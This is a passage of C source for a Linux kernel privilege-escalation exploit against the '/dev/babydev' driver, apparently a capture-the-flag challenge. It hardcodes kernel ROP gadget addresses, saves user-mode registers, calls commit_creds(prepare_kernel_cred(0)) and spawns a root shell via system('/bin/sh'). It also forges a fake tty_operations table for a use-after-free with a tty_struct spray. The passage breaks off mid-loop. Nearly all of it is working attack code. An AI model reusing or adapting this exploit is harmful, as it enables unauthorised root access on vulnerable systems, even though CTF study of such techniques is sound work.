    74.
    75./* Gadgets */
    76.commit_creds_func commit_creds = (commit_creds_func) 0xffffffff810a1420;
    77.prepare_kernel_cred_func prepare_kernel_cred = (prepare_kernel_cred_func) 0xffffffff810a1810;
    78.unsigned long native_write_cr4 = 0xFFFFFFFF810635B0;
    79.unsigned long xchgeaxesp = 0xFFFFFFFF81007808;
    80.unsigned long poprdiret = 0xFFFFFFFF813E7D6F;
    81.//unsigned long iretq = 0xFFFFFFFF8181A797;
    82.unsigned long iretq = 0xffffffff814e35ef;
    83.unsigned long swapgs = 0xFFFFFFFF81063694;
    84.
    85./* status */
    86.unsigned long user_cs, user_ss, user_eflags;
    87.void save_stats() {
    88. asm(
    89. "movq %%cs, %0n"
    90. "movq %%ss, %1n"
    91. "pushfqn"
    92. "popq %2n"
    93. :"=r"(user_cs), "=r"(user_ss), "=r"(user_eflags)
    94. :
    95. : "memory"
    96. );
    97.}
    98.
    99.void get_shell() {
    100. // char *shell_str = "/bin/sh";
    101. // char *args[] = {shell_str, NULL};
    102. // execve(shell_str, args, NULL);
    103. system("/bin/sh");
    104.}
    105.
    106.void shellcode() {
    107. commit_creds(prepare_kernel_cred(0));
    108.}
    109.
    110.void exploit() {
    111. char *buf = (char*) malloc(0x1000);
    112. char *fake_file_operations = (char*) calloc(0x1000, 1); // big enough to be file_operations
    113. struct tty_operations *fake_tty_operations = (struct tty_operations *) malloc(sizeof(struct tty_operations));
    114. 
    115. save_stats();
    116. 
    117. memset(fake_tty_operations, 0, sizeof(struct tty_operations));
    118. fake_tty_operations->proc_fops = &fake_file_operations;
    119. fake_tty_operations->ioctl = (unsigned long)xchgeaxesp;
    120. 
    121. int fd1 = open("/dev/babydev", O_RDWR);
    122. int fd2 = open("/dev/babydev", O_RDWR);
    123. int fd;
    124. //ioctl(fd2, 0x10001, 0xa8); // the same'11 as cred struct size
    125. ioctl(fd2, 0x10001, TTY_STRUCT_SIZE);
    126. write(fd2, "hello world", strlen("hello world"));
    127. close(fd1);
    128. fd = fd2;
    129. 
    130. // spray tty
    131. puts("[+] Spraying buffer with tty_struct");
    132. for (int i = 0; i 
2\. 